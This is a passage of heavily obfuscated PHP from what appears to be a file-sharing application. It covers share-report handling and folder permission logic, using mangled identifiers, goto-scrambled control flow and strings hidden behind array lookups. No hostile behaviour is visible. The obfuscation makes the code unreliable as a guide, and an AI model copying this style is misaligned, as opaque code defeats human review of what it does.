$c¸ïˆ…¥ŒÄ[$dĞ«ÖŒ‰¿¿[84]] = $eªÎÌ‡‡ «[$b‰ÒãÙ¦Ç] ? $eªÎÌ‡‡ «[$b‰ÒãÙ¦Ç] : !1; if (!$c¸ïˆ…¥ŒÄ[$dĞ«ÖŒ‰¿¿[84]] || $c¸ïˆ…¥ŒÄ[$dĞ«ÖŒ‰¿¿[84]][$dĞ«ÖŒ‰¿¿[417]] == $dĞ«ÖŒ‰¿¿[86]) { unset($cÈâ¥ÇìæÌ[$EöÅŠİ‘¶å]); } } goto A‹¢Ï×É§; A‹¢Ï×É§: unset($c¸ïˆ…¥ŒÄ); $cÈâ¥ÇìæÌ = array_values($cÈâ¥ÇìæÌ); goto bÉî³‘¾¿Å; bÉî³‘¾¿Å: } private function _makeOrder($a‚Ïá„±Î¿ = '') { goto e†Íì³–Ìœ; e†Íì³–Ìœ: $DÅ‚®âã† =& $_SERVER[¹Ò‹Ò¹]; $Eëß•Ã¥È = array($DÅ‚®âã†[192], $DÅ‚®âã†[470], $DÅ‚®âã†[1815], $DÅ‚®âã†[1816]); $cÖ¶øÇŠôŒ = array($DÅ‚®âã†[422] => $DÅ‚®âã†[423], $DÅ‚®âã†[424] => $DÅ‚®âã†[425]); goto F²÷ï¼ï‡¤; F²÷ï¼ï‡¤: $fæ×…ÇãÌ› = Input::get($DÅ‚®âã†[429], $DÅ‚®âã†[7], $DÅ‚®âã†[410], $Eëß•Ã¥È); $cùôô£Ïãñ = Input::get($DÅ‚®âã†[430], $DÅ‚®âã†[7], $DÅ‚®âã†[1827], array($DÅ‚®âã†[1751], $DÅ‚®âã†[424])); $cùôô£Ïãñ = $cÖ¶øÇŠôŒ[$cùôô£Ïãñ]; goto AâƒŞŒ òñ; AâƒŞŒ òñ: $a‚Ïá„±Î¿ = $a‚Ïá„±Î¿ . "{$fæ×…ÇãÌ›}\40{$cùôô£Ïãñ}"; return $this->order($a‚Ïá„±Î¿); goto bÀ×Çç›‹Ñ; bÀ×Çç›‹Ñ: } public function reportAdd($eÊ¤¥­Şô) { $aì…Ê‘¬Ã³ =& $_SERVER[¹Ò‹Ò¹]; $e‰£Ê®à•Ì = array($aì…Ê‘¬Ã³[462] => $eÊ¤¥­Şô[$aì…Ê‘¬Ã³[462]], $aì…Ê‘¬Ã³[1504] => USER_ID); if (Model($aì…Ê‘¬Ã³[1823])->where($e‰£Ê®à•Ì)->find()) { return !1; } $f¶ö×Ûêå• = array($aì…Ê‘¬Ã³[462] => $eÊ¤¥­Şô[$aì…Ê‘¬Ã³[462]], $aì…Ê‘¬Ã³[1410] => $eÊ¤¥­Şô[$aì…Ê‘¬Ã³[1410]], $aì…Ê‘¬Ã³[390] => $eÊ¤¥­Şô[$aì…Ê‘¬Ã³[390]], $aì…Ê‘¬Ã³[441] => $eÊ¤¥­Şô[$aì…Ê‘¬Ã³[441]], $aì…Ê‘¬Ã³[1504] => USER_ID, $aì…Ê‘¬Ã³[29] => $eÊ¤¥­Şô[$aì…Ê‘¬Ã³[29]], $aì…Ê‘¬Ã³[425] => $eÊ¤¥­Şô[$aì…Ê‘¬Ã³[425]]); return Model($aì…Ê‘¬Ã³[1823])->add($f¶ö×Ûêå•); } public function reportList($B‹é´½Í’á) { goto aè®·´§–; aè®·´§–: $FÚÜ˜„½ë =& $_SERVER[¹Ò‹Ò¹]; $c·æˆë·çÙ = array(); if ($B‹é´½Í’á[$FÚÜ˜„½ë[717]]) { $EõÙœÏ«‹ = $B‹é´½Í’á[$FÚÜ˜„½ë[470]] ? $B‹é´½Í’á[$FÚÜ˜„½ë[470]] : strtotime(date($FÚÜ˜„½ë[1825])); $c·æˆë·çÙ[$FÚÜ˜„½ë[192]] = array($FÚÜ˜„½ë[329], array($B‹é´½Í’á[$FÚÜ˜„½ë[717]], $EõÙœÏ«‹)); } goto fô¦á÷«­“; EÊ•½øœ’: $this->_listDataApply($aºˆÓ¢¹‚[$FÚÜ˜„½ë[365]]); return $aºˆÓ¢¹‚; goto b›•™²Ø…; dÖôÓîø´­: if (empty($aºˆÓ¢¹‚[$FÚÜ˜„½ë[365]])) { return array(); } $A¯ÃßáÖÙ“ = array_to_keyvalue_group($aºˆÓ¢¹‚[$FÚÜ˜„½ë[365]], $FÚÜ˜„½ë[704], $FÚÜ˜„½ë[462]); if (!empty($A¯ÃßáÖÙ“[0])) { $B‹é´½Í’á = $A¯ÃßáÖÙ“[0]; $c·æˆë·çÙ = array($FÚÜ˜„½ë[462] => array($FÚÜ˜„½ë[7], $B‹é´½Í’á)); $b¢¬—ë»¿Ò = $this->where($c·æˆë·çÙ)->field($FÚÜ˜„½ë[462])->select(); $b¢¬—ë»¿Ò = array_to_keyvalue($b¢¬—ë»¿Ò, $FÚÜ˜„½ë[33], $FÚÜ˜„½ë[462]); $eïæ’ïÜ£± = array_diff($B‹é´½Í’á, $b¢¬—ë»¿Ò); if (!empty($eïæ’ïÜ£±)) { foreach ($aºˆÓ¢¹‚[$FÚÜ˜„½ë[365]] as $AŒÙ©¢øô => $b¬¯İÌËâ–) { if (in_array($b¬¯İÌËâ–[$FÚÜ˜„½ë[462]], $eïæ’ïÜ£±)) { unset($aºˆÓ¢¹‚[$FÚÜ˜„½ë[365]][$AŒÙ©¢øô]); } } } } goto EÊ•½øœ’; f¾Ó‘Š“: $AÑáÚ§¬ÏÌ = array($FÚÜ˜„½ë[422] => $FÚÜ˜„½ë[423], $FÚÜ˜„½ë[424] => $FÚÜ˜„½ë[425]); $Bê‘•¸Îã¨ = $FÚÜ˜„½ë[1832] . $AÑáÚ§¬ÏÌ[$A‘Ò‚·Áñƒ]; $aºˆÓ¢¹‚ = Model($FÚÜ˜„½ë[1823])->where($c·æˆë·çÙ)->order($Bê‘•¸Îã¨)->selectPage(20); goto dÖôÓîø´­; fô¦á÷«­“: if (isset($B‹é´½Í’á[$FÚÜ˜„½ë[29]]) && in_array($B‹é´½Í’á[$FÚÜ˜„½ë[29]], array($FÚÜ˜„½ë[86], $FÚÜ˜„½ë[1828], $FÚÜ˜„½ë[1829], $FÚÜ˜„½ë[1830], $FÚÜ˜„½ë[1831]))) { $c·æˆë·çÙ[$FÚÜ˜„½ë[29]] = $B‹é´½Í’á[$FÚÜ˜„½ë[29]]; } if (isset($B‹é´½Í’á[$FÚÜ˜„½ë[704]]) && in_array($B‹é´½Í’á[$FÚÜ˜„½ë[704]], array($FÚÜ˜„½ë[491], $FÚÜ˜„½ë[86], $FÚÜ˜„½ë[1828], $FÚÜ˜„½ë[1829]))) { $c·æˆë·çÙ[$FÚÜ˜„½ë[704]] = $B‹é´½Í’á[$FÚÜ˜„½ë[704]]; } $A‘Ò‚·Áñƒ = Input::get($FÚÜ˜„½ë[430], $FÚÜ˜„½ë[7], $FÚÜ˜„½ë[1827], array($FÚÜ˜„½ë[1751], $FÚÜ˜„½ë[424])); goto f¾Ó‘Š“; b›•™²Ø…: } public function reportStatus($bõñ÷ÆêÌ) { goto c…øáœÏµ; C«£„İôÈµ: $c¿¨Úëî¸Š = Model($eôÃÄ‡ÃÑ÷[1823])->where($D½Öœè­‘†)->save($EË±•Ÿ—ê£); if ($bõñ÷ÆêÌ[$eôÃÄ‡ÃÑ÷[704]] == $eôÃÄ‡ÃÑ÷[1828]) { if ($dÚšÍê‘·[$eôÃÄ‡ÃÑ÷[441]] != $eôÃÄ‡ÃÑ÷[491] && $this->shareFileMeta($dÚšÍê‘·[$eôÃÄ‡ÃÑ÷[441]])) { $this->shareFileMeta($dÚšÍê‘·[$eôÃÄ‡ÃÑ÷[441]], 0); } $this->remove($dÚšÍê‘·[$eôÃÄ‡ÃÑ÷[462]]); return !0; } if ($c¿¨Úëî¸Š && $bõñ÷ÆêÌ[$eôÃÄ‡ÃÑ÷[704]] == $eôÃÄ‡ÃÑ÷[1829]) { $eÄğŸ®Šƒ = $EË±•Ÿ—ê£[$eôÃÄ‡ÃÑ÷[704]] == $eôÃÄ‡ÃÑ÷[1829] ? 1 : 0; $this->shareFileMeta($dÚšÍê‘·[$eôÃÄ‡ÃÑ÷[441]], $eÄğŸ®Šƒ); $this->removeByFile($dÚšÍê‘·[$eôÃÄ‡ÃÑ÷[441]]); } goto CçØØß¡„å; BµŞŒé¿Ä: if (!$dÚšÍê‘·) { return !1; } $EË±•Ÿ—ê£ = array($eôÃÄ‡ÃÑ÷[704] => $bõñ÷ÆêÌ[$eôÃÄ‡ÃÑ÷[704]]); if ($bõñ÷ÆêÌ[$eôÃÄ‡ÃÑ÷[704]] == $eôÃÄ‡ÃÑ÷[1829] && $dÚšÍê‘·[$eôÃÄ‡ÃÑ÷[704]] == $eôÃÄ‡ÃÑ÷[1829]) { $EË±•Ÿ—ê£[$eôÃÄ‡ÃÑ÷[704]] = 0; } goto C«£„İôÈµ; c…øáœÏµ: $eôÃÄ‡ÃÑ÷ =& $_SERVER[¹Ò‹Ò¹]; $D½Öœè­‘† = array($eôÃÄ‡ÃÑ÷[388] => $bõñ÷ÆêÌ[$eôÃÄ‡ÃÑ÷[388]]); $dÚšÍê‘· = Model($eôÃÄ‡ÃÑ÷[1823])->where($D½Öœè­‘†)->field($eôÃÄ‡ÃÑ÷[1833])->find(); goto BµŞŒé¿Ä; CçØØß¡„å: return $c¿¨Úëî¸Š; goto Eß•›ãÊ¢¢; Eß•›ãÊ¢¢: } private function removeByFile($f²·„¬•µ) { goto C×«øô“Í; C×«øô“Í: $eëŸ‘ªƒ‡› =& $_SERVER[¹Ò‹Ò¹]; $DÖ¤ïÖ˜’£ = Model($eëŸ‘ªƒ‡›[769])->where(array($eëŸ‘ªƒ‡›[441] => $f²·„¬•µ))->field($eëŸ‘ªƒ‡›[390])->select(); $F³Ÿ’ÙØ• = array_to_keyvalue($DÖ¤ïÖ˜’£, $eëŸ‘ªƒ‡›[33], $eëŸ‘ªƒ‡›[390]); goto A‹ôÈ©±††; A¨ğäˆ²½Ó: $dšàÇÃ„™ = array_to_keyvalue($DÖ¤ïÖ˜’£, $eëŸ‘ªƒ‡›[33], $eëŸ‘ªƒ‡›[462]); $this->remove($dšàÇÃ„™); goto dïç§œà; A‹ôÈ©±††: $E’™’åè¶² = array($eëŸ‘ªƒ‡›[390] => array($eëŸ‘ªƒ‡›[7], $F³Ÿ’ÙØ•), $eëŸ‘ªƒ‡›[467] => 1); $DÖ¤ïÖ˜’£ = $this->where($E’™’åè¶²)->field($eëŸ‘ªƒ‡›[462])->select(); if (empty($DÖ¤ïÖ˜’£)) { return; } goto A¨ğäˆ²½Ó; dïç§œà: } private function shareFileMeta($d–ñ£ïğ½, $CÇ•ÙÚ•¼Â = null) { $D…¡‹ëÏÅ´ =& $_SERVER[¹Ò‹Ò¹]; $bÔ°‡ õ» = array($D…¡‹ëÏÅ´[441] => $d–ñ£ïğ½, $D…¡‹ëÏÅ´[92] => $D…¡‹ëÏÅ´[1834]); if (is_null($CÇ•ÙÚ•¼Â)) { return Model($D…¡‹ëÏÅ´[1835])->where($bÔ°‡ õ»)->find(); } $bÔ°‡ õ»[$D…¡‹ëÏÅ´[370]] = $CÇ•ÙÚ•¼Â; Model($D…¡‹ëÏÅ´[1835])->add($bÔ°‡ õ», array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\x72\143\x65\137\141\x75\x74\150"; public function getAuth($C¯ôÌ´¸„) { goto f¨ãøèÕ“Ô; FÉîÎÎ¹: $dçÀ²¶¡Õñ = array(); $cĞí³¸ = 2 << 25; foreach ($D–·ºÍëë as $a…Øºõ“·) { goto aøÄˆï´Ş; aøÄˆï´Ş: $A¯Ó¿­âêÜ = Model($B®ˆÖÄ…«ê[1836])->listData($a…Øºõ“·[$B®ˆÖÄ…«ê[1764]]); if (!$A¯Ó¿­âêÜ) { continue; } $fÅİŞÕæïÈ[] = $a…Øºõ“·; goto FİîŞÑÊ¹‡; A´¼‘ÂŞ‡–: if ($a…Øºõ“·[$B®ˆÖÄ…«ê[398]] == SourceModel::TYPE_USER && $a…Øºõ“·[$B®ˆÖÄ…«ê[478]] == $B®ˆÖÄ…«ê[491]) { $b§Áìƒ¤Šê = 0; } $dçÀ²¶¡Õñ[] = $A¯Ó¿­âêÜ[$B®ˆÖÄ…«ê[400]] + $b§Áìƒ¤Šê; goto E½‡ù­´ç; FİîŞÑÊ¹‡: $b§Áìƒ¤Šê = 0; if ($a…Øºõ“·[$B®ˆÖÄ…«ê[398]] == SourceModel::TYPE_GROUP) { $b§Áìƒ¤Šê = $cĞí³¸ * 2; } if ($a…Øºõ“·[$B®ˆÖÄ…«ê[398]] == SourceModel::TYPE_USER) { $b§Áìƒ¤Šê = $cĞí³¸; } goto A´¼‘ÂŞ‡–; E½‡ù­´ç: } goto dİö¶äñ„ƒ; f¨ãøèÕ“Ô: $B®ˆÖÄ…«ê =& $_SERVER[¹Ò‹Ò¹]; $D–·ºÍëë = $this->sourceAuthSelect($C¯ôÌ´¸„); $fÅİŞÕæïÈ = array(); goto FÉîÎÎ¹; dİö¶äñ„ƒ: array_multisort($dçÀ²¶¡Õñ, SORT_DESC, $fÅİŞÕæïÈ); return $fÅİŞÕæïÈ; goto B¦Ñ×ïé™; B¦Ñ×ïé™: } public function sourceAuthSelect($CŠ›ëâ©ğ) { goto EÈã˜šÀ»; EÈã˜šÀ»: $FÅÚã¡™†ã =& $_SERVER[¹Ò‹Ò¹]; static $cƒ‹Ù„á…ë = array(); $cä„Õİ½ô = is_array($CŠ›ëâ©ğ) ? !1 : !0; goto eÄªÒŸæ¹; eÄªÒŸæ¹: if ($cä„Õİ½ô) { $CŠ›ëâ©ğ = array($CŠ›ëâ©ğ); } $D¸Şˆ‡¯ß = array(); foreach ($CŠ›ëâ©ğ as $cèˆ…Õ‘”) { if (isset($cƒ‹Ù„á…ë[$cèˆ…Õ‘”])) { $D¸Şˆ‡¯ß[$cèˆ…Õ‘”] = $cƒ‹Ù„á…ë[$cèˆ…Õ‘”]; } } goto E…Øô³“·á; fÖ„½ÜšˆÓ: $DŒƒºªôæÕ = $this->field($fØ÷áÀË¹‡)->order($FÅÚã¡™†ã[388])->where($Dî”¥¯Ê×ø)->select(); $d›ÂøØµ = array_to_keyvalue_group($DŒƒºªôæÕ, $FÅÚã¡™†ã[390]); foreach ($CŠ›ëâ©ğ as $cèˆ…Õ‘”) { $cƒ‹Ù„á…ë[$cèˆ…Õ‘”] = $d›ÂøØµ[$cèˆ…Õ‘”] ? $d›ÂøØµ[$cèˆ…Õ‘”] : array(); } goto F­ˆ˜®Íë–; F­ˆ˜®Íë–: if ($cä„Õİ½ô) { return $DŒƒºªôæÕ; } return $d›ÂøØµ; goto eœ¥°Ù“ªÒ; E…Øô³“·á: if (count($D¸Şˆ‡¯ß) == count($CŠ›ëâ©ğ)) { return $cä„Õİ½ô ? $D¸Şˆ‡¯ß[$CŠ›ëâ©ğ[0]] : $D¸Şˆ‡¯ß; } $fØ÷áÀË¹‡ = $FÅÚã¡™†ã[1837]; $Dî”¥¯Ê×ø = array($FÅÚã¡™†ã[390] => array($FÅÚã¡™†ã[7], $CŠ›ëâ©ğ)); goto fÖ„½ÜšˆÓ; eœ¥°Ù“ªÒ: } public function setAuth($D¼æ‡‹÷çÛ, $dÑ“—öÃ²´) { goto CƒÁõ¾Æª; aÃ§›‰£õ×: foreach ($dÑ“—öÃ²´ as $aãóáã‰´) { if (!in_array($aãóáã‰´[$A½õ¼µ†Œ[398]], $cãŸ¸®©†¬)) { show_json(LNG($A½õ¼µ†Œ[1838]), !1); } if ($b·†ôÉø§ != $CÂ›“Ş§†) { if ($aãóáã‰´[$A½õ¼µ†Œ[398]] == SourceModel::TYPE_GROUP) { } if ($aãóáã‰´[$A½õ¼µ†Œ[478]] != 0 && !in_array($aãóáã‰´[$A½õ¼µ†Œ[478]], $a¤É¬Ó‚²)) { } } if ($aãóáã‰´[$A½õ¼µ†Œ[478]] == 0) { $aãóáã‰´[$A½õ¼µ†Œ[398]] = SourceModel::TYPE_USER; } $E¸¹ë‘ÔèŠ[] = array($A½õ¼µ†Œ[390] => $D¼æ‡‹÷çÛ, $A½õ¼µ†Œ[398] => intval($aãóáã‰´[$A½õ¼µ†Œ[398]]), $A½õ¼µ†Œ[478] => intval($aãóáã‰´[$A½õ¼µ†Œ[478]]), $A½õ¼µ†Œ[1764] => intval($aãóáã‰´[$A½õ¼µ†Œ[1764]]) ? intval($aãóáã‰´[$A½õ¼µ†Œ[1764]]) : 0, $A½õ¼µ†Œ[1818] => intval($aãóáã‰´[$A½õ¼µ†Œ[1818]]) ? intval($aãóáã‰´[$A½õ¼µ†Œ[1818]]) : -1); } $this->where(array($A½õ¼µ†Œ[404] => $D¼æ‡‹÷çÛ))->delete(); $this->addAll($E¸¹ë‘ÔèŠ); goto aŠ½ƒÔ†õ›; CƒÁõ¾Æª: $A½õ¼µ†Œ =& $_SERVER[¹Ò‹Ò¹]; $D£ã†åœŒ¾ = Model($A½õ¼µ†Œ[1179])->sourceInfo($D¼æ‡‹÷çÛ); if (!$D£ã†åœŒ¾) { return !1; } goto cÂ‚çé‚ĞÕ; aŠ½ƒÔ†õ›: return !0; goto f“¨„—æçø; cÂ‚çé‚ĞÕ: if ($D£ã†åœŒ¾[$A½õ¼µ†Œ[398]] != SourceModel::TYPE_GROUP) { return !1; } $CÂ›“Ş§† = 1; $b·†ôÉø§ = $D£ã†åœŒ¾[$A½õ¼µ†Œ[478]]; goto BŞìğÛÉ¦Ú; BŞìğÛÉ¦Ú: if ($b·†ôÉø§ != $CÂ›“Ş§†) { $E¡ÛÙî¬Ü = array($A½õ¼µ†Œ[1667] => $b·†ôÉø§); $a¤É¬Ó‚² = Model($A½õ¼µ†Œ[1750])->field($A½õ¼µ†Œ[1504])->where($E¡ÛÙî¬Ü)->select(); $a¤É¬Ó‚² = array_to_keyvalue($a¤É¬Ó‚², $A½õ¼µ†Œ[33], $A½õ¼µ†Œ[1504]); } $cãŸ¸®©†¬ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $E¸¹ë‘ÔèŠ = array(); goto aÃ§›‰£õ×; f“¨„—æçø: } public function authClear($FÆ‹ŠœãÇ) { $FÚİ¿ÙÎ¯Ğ =& $_SERVER[¹Ò‹Ò¹]; $EíÏ¤‰…ªÍ = Model($FÚİ¿ÙÎ¯Ğ[1179])->sourceInfo($FÆ‹ŠœãÇ); $F¢œ¢ˆİ×ß = array($FÆ‹ŠœãÇ); if ($EíÏ¤‰…ªÍ[$FÚİ¿ÙÎ¯Ğ[397]] == $FÚİ¿ÙÎ¯Ğ[86]) { $f¹Øˆ¼‚Ïé = array($FÚİ¿ÙÎ¯Ğ[548] => array($FÚİ¿ÙÎ¯Ğ[507], $EíÏ¤‰…ªÍ[$FÚİ¿ÙÎ¯Ğ[481]] . $FÆ‹ŠœãÇ . $FÚİ¿ÙÎ¯Ğ[508])); $F¢œ¢ˆİ×ß = Model($FÚİ¿ÙÎ¯Ğ[1179])->field($FÚİ¿ÙÎ¯Ğ[404])->where($f¹Øˆ¼‚Ïé)->getField($FÚİ¿ÙÎ¯Ğ[390], !0); $F¢œ¢ˆİ×ß[] = $FÆ‹ŠœãÇ; } $this->where(array($FÚİ¿ÙÎ¯Ğ[404] => array($FÚİ¿ÙÎ¯Ğ[405], $F¢œ¢ˆİ×ß)))->delete(); return !0; } public function getAllChildren($AÊ»…Î†Ë) { goto AÛÒìƒ»ğŠ; cƒŸï«„¬: $f•ê²æ§¨ä = Model($fğÀß°‚â[769])->field($Aé Ä—¸È”)->where($B—¯ßİ„°)->select(); $D©î•²¦¢É = array($AÊ»…Î†Ë); foreach ($f•ê²æ§¨ä as $cŒ²ÓÀÄ˜¼) { foreach ($c´öø£ˆ°‚ as $F«©»éà) { $A†¬öçÌ¡ = $fğÀß°‚â[47] . $F«©»éà . $fğÀß°‚â[47]; $c‰ÏãÈ˜ = $cŒ²ÓÀÄ˜¼[$fğÀß°‚â[481]] . $cŒ²ÓÀÄ˜¼[$fğÀß°‚â[390]] . $fğÀß°‚â[47]; if (strstr($c‰ÏãÈ˜, $A†¬öçÌ¡)) { $D©î•²¦¢É[] = $cŒ²ÓÀÄ˜¼[$fğÀß°‚â[390]]; break; } } } goto B°éèæåõ; E¯‰Ä¥‚: if (!$EŸÌÅ“‹—ï) { return array(); } $Aé Ä—¸È” = $fğÀß°‚â[1839]; $B—¯ßİ„° = array($fğÀß°‚â[390] => array($fğÀß°‚â[7], $EŸÌÅ“‹—ï), $fğÀß°‚â[417] => $fğÀß°‚â[491]); goto cƒŸï«„¬; AÁÂœ†¤ÛÑ: if ($B§ª°„äƒœ[$fğÀß°‚â[472]] == $fğÀß°‚â[491] && $B§ª°„äƒœ[$fğÀß°‚â[478]] != $AİÜ›•ùù†) { $c´öø£ˆ°‚ = $this->groupChidldAllRootSource($B§ª°„äƒœ[$fğÀß°‚â[478]]); } $EŸÌÅ“‹—ï = $this->field($fğÀß°‚â[390])->group($fğÀß°‚â[390])->select(); $EŸÌÅ“‹—ï = array_to_keyvalue($EŸÌÅ“‹—ï, $fğÀß°‚â[33], $fğÀß°‚â[390]); goto E¯‰Ä¥‚; B°éèæåõ: return $this->sourceListAuth($D©î•²¦¢É); goto aÍŒóÆ±Û‘; F°ÆÕø¿—Ã: if ($B§ª°„äƒœ[$fğÀß°‚â[398]] != SourceModel::TYPE_GROUP) { return array(); } $AİÜ›•ùù† = 1; $c´öø£ˆ°‚ = array($AÊ»…Î†Ë); goto AÁÂœ†¤ÛÑ; AÛÒìƒ»ğŠ: $fğÀß°‚â =& $_SERVER[¹Ò‹Ò¹]; $B§ª°„äƒœ = Model($fğÀß°‚â[1179])->sourceInfo($AÊ»…Î†Ë); if ($B§ª°„äƒœ[$fğÀß°‚â[397]] != $fğÀß°‚â[86]) { return $this->sourceListAuth(array($AÊ»…Î†Ë)); } goto F°ÆÕø¿—Ã; aÍŒóÆ±Û‘: } private function sourceListAuth($añ¦î¸çá„) { goto f×è¥Óõ®é; f×è¥Óõ®é: $cª„©®Ë³ =& $_SERVER[¹Ò‹Ò¹]; $F­Å‚˜†ƒÊ = Model($cª„©®Ë³[1179])->sourceListInfo($añ¦î¸çá„, !0); $bˆ†ì‰‰³ = $this->sourceAuthSelect($añ¦î¸çá„); goto b©İïØ·±; EƒÅÜµ¸Íä: array_multisort($eçÖ–©‘é, SORT_ASC, $b êïÖÑË’); return $b êïÖÑË’; goto eö“Å–³‚; b©İïØ·±: $b êïÖÑË’ = array(); $eçÖ–©‘é = array(); foreach ($F­Å‚˜†ƒÊ as $EİÚîÙÈì) { goto Añ–â­½¶Ï; DÉóãÄ®™¾: unset($EİÚîÙÈì[$cª„©®Ë³[84]]); $A¡Ì—Ş°ƒ• = $bˆ†ì‰‰³[$EİÚîÙÈì[$cª„©®Ë³[390]]]; if (!$A¡Ì—Ş°ƒ•) { continue; } goto bë÷ËØïˆ‰; Añ–â­½¶Ï: unset($EİÚîÙÈì[$cª„©®Ë³[428]]); unset($EİÚîÙÈì[$cª„©®Ë³[426]]); unset($EİÚîÙÈì[$cª„©®Ë³[400]]); goto DÉóãÄ®™¾; bë÷ËØïˆ‰: $EİÚîÙÈì[$cª„©®Ë³[1840]] = $this->authTargetInfo($A¡Ì—Ş°ƒ•); $EİÚîÙÈì[$cª„©®Ë³[489]] = rtrim($EİÚîÙÈì[$cª„©®Ë³[484]], $cª„©®Ë³[8]) . $cª„©®Ë³[8] . ltrim($EİÚîÙÈì[$cª„©®Ë³[489]], $cª„©®Ë³[8]); $b êïÖÑË’[] = $EİÚîÙÈì; goto DÇâ³©‘å; DÇâ³©‘å: $fÕ¾Ì¶²Çæ = count(explode($cª„©®Ë³[8], trim($EİÚîÙÈì[$cª„©®Ë³[489]], $cª„©®Ë³[8]))); $eçÖ–©‘é[] = $fÕ¾Ì¶²Çæ + ($EİÚîÙÈì[$cª„©®Ë³[29]] == $cª„©®Ë³[76] ? 0 : 1000); goto B§õ—Ü´¾; B§õ—Ü´¾: } goto EƒÅÜµ¸Íä; eö“Å–³‚: } private function groupChidldAllRootSource($A¿Õğ¼Úà) { $AÉ‘‰Šä‚ =& $_SERVER[¹Ò‹Ò¹]; $EÊèãØã…Ä = Model($AÉ‘‰Šä‚[1841])->groupChildrenAll($A¿Õğ¼Úà); $e°öö¾ïÃ = array($AÉ‘‰Šä‚[472] => 0, $AÉ‘‰Šä‚[478] => array($AÉ‘‰Šä‚[7], $EÊèãØã…Ä), $AÉ‘‰Šä‚[398] => SourceModel::TYPE_GROUP); $dÕÊ‹¥ñ•© = Model($AÉ‘‰Šä‚[769])->field($AÉ‘‰Šä‚[390])->where($e°öö¾ïÃ)->select(); $dÕÊ‹¥ñ•© = array_to_keyvalue($dÕÊ‹¥ñ•©, $AÉ‘‰Šä‚[33], $AÉ‘‰Šä‚[390]); return $dÕÊ‹¥ñ•©; } private function authTargetInfo($c‹Ş†•³¤†) { goto BÈ‰Ó‚Ó“; BÈ‰Ó‚Ó“: $Cç§ªÖå§ =& $_SERVER[¹Ò‹Ò¹]; $F¹¸Ï…½¹Ì = array(); $b¾Ò›ñŠ¡Ø = array(); goto Có™Ïä©; Có™Ïä©: $D ÁƒÊ«œ = 2 << 25; foreach ($c‹Ş†•³¤† as $Cö¢ô¢°®) { goto dË‘Š·Ö¥Ÿ; F¼ÍÉ´Ë–÷: $Aéô…êà´¼ = 0; if ($Cö¢ô¢°®[$Cç§ªÖå§[398]] == SourceModel::TYPE_GROUP) { $Aéô…êà´¼ = $D ÁƒÊ«œ * 2; } if ($Cö¢ô¢°®[$Cç§ªÖå§[398]] == SourceModel::TYPE_USER) { $Aéô…êà´¼ = $D ÁƒÊ«œ; } goto E¾½Çìøì; a«ùà‹‡Ç: if (!$B‡ÙÈŒ£Î) { continue; } $B‡ÙÈŒ£Î[$Cç§ªÖå§[440]] = $B—ï‡Ê ¬; $F¹¸Ï…½¹Ì[] = $B‡ÙÈŒ£Î; goto F¼ÍÉ´Ë–÷; E¾½Çìøì: if ($Cö¢ô¢°®[$Cç§ªÖå§[398]] == SourceModel::TYPE_USER && $Cö¢ô¢°®[$Cç§ªÖå§[478]] == $Cç§ªÖå§[491]) { $Aéô…êà´¼ = 0; } $b¾Ò›ñŠ¡Ø[] = $B—ï‡Ê ¬[$Cç§ªÖå§[400]] + $Aéô…êà´¼; goto C«Áô¬·ê´; dË‘Š·Ö¥Ÿ: $B—ï‡Ê ¬ = Model($Cç§ªÖå§[1836])->listData($Cö¢ô¢°®[$Cç§ªÖå§[1764]]); if (!$B—ï‡Ê ¬) { continue; } if ($Cö¢ô¢°®[$Cç§ªÖå§[398]] == SourceModel::TYPE_USER) { $B‡ÙÈŒ£Î = Model($Cç§ªÖå§[497])->getInfoSimpleOuter($Cö¢ô¢°®[$Cç§ªÖå§[478]]); if ($B‡ÙÈŒ£Î[$Cç§ªÖå§[1504]] == $Cç§ªÖå§[1060]) { continue; } if ($B‡ÙÈŒ£Î[$Cç§ªÖå§[1504]] == $Cç§ªÖå§[491]) { $B‡ÙÈŒ£Î[$Cç§ªÖå§[28]] = LNG($Cç§ªÖå§[1842]); } } else { $B‡ÙÈŒ£Î = Model($Cç§ªÖå§[480])->getInfoSimple($Cö¢ô¢°®[$Cç§ªÖå§[478]]); } goto a«ùà‹‡Ç; C«Áô¬·ê´: } array_multisort($b¾Ò›ñŠ¡Ø, SORT_DESC, $F¹¸Ï…½¹Ì); goto Fœõ®é†½í; Fœõ®é†½í: return $F¹¸Ï…½¹Ì; goto Bøšìºˆ‘—; Bøšìºˆ‘—: } public function getAllChildrenByUser($c¨ùÙ‘¡ç’, $CŞõó¦Åè) { goto eáŞƒ£Ş; AÒ­×Í·: foreach ($E ºÉ¬‹‡† as $AëÖ²è„½) { $EÔÉ¶ö„İ = !1; foreach ($AëÖ²è„½[$a‘›‰á¯©ë[1840]] as $f­—÷¬À) { if ($f­—÷¬À[$a‘›‰á¯©ë[1504]]) { if ($f­—÷¬À[$a‘›‰á¯©ë[1504]] == $CŞõó¦Åè) { $EÔÉ¶ö„İ = !0; break; } } if ($f­—÷¬À[$a‘›‰á¯©ë[1667]]) { if ($this->groupContainUser($f­—÷¬À[$a‘›‰á¯©ë[1667]], $CŞõó¦Åè)) { $EÔÉ¶ö„İ = !0; break; } } } if ($EÔÉ¶ö„İ) { $f›çÀàõÂ¿[] = $AëÖ²è„½; } $Aä¼ÑÑÔ = $AëÖ²è„½[$a‘›‰á¯©ë[390]]; if (isset($EÓòø¢»ÑÚ[$Aä¼ÑÑÔ])) { $AëÖ²è„½[$a‘›‰á¯©ë[1840]][] = $EÓòø¢»ÑÚ[$Aä¼ÑÑÔ][0]; $EÓòø¢»ÑÚ[$Aä¼ÑÑÔ] = !1; } } $EÓòø¢»ÑÚ = array_filter(array_values($EÓòø¢»ÑÚ)); $f›çÀàõÂ¿ = array_merge($EÓòø¢»ÑÚ, $f›çÀàõÂ¿); goto E·ïŠóœŸ¦; eáŞƒ£Ş: $a‘›‰á¯©ë =& $_SERVER[¹Ò‹Ò¹]; $a‡äÏëŒ—˜ = Model($a‘›‰á¯©ë[501])->getInfo($CŞõó¦Åè); if (!$CŞõó¦Åè || !$c¨ùÙ‘¡ç’ || !$a‡äÏëŒ—˜) { return array(); } goto fæäÙŞ³Šë; fæäÙŞ³Šë: $bçôÛàÆÄŸ = Model($a‘›‰á¯©ë[1179])->sourceInfo($c¨ùÙ‘¡ç’); $EÓòø¢»ÑÚ = array(); $eÚÎ†ˆÎïá = 1; goto bŸôöÃù˜; E·ïŠóœŸ¦: return $f›çÀàõÂ¿; goto dƒÃÃ‰©•; bŸôöÃù˜: if ($bçôÛàÆÄŸ[$a‘›‰á¯©ë[472]] == $a‘›‰á¯©ë[491] && 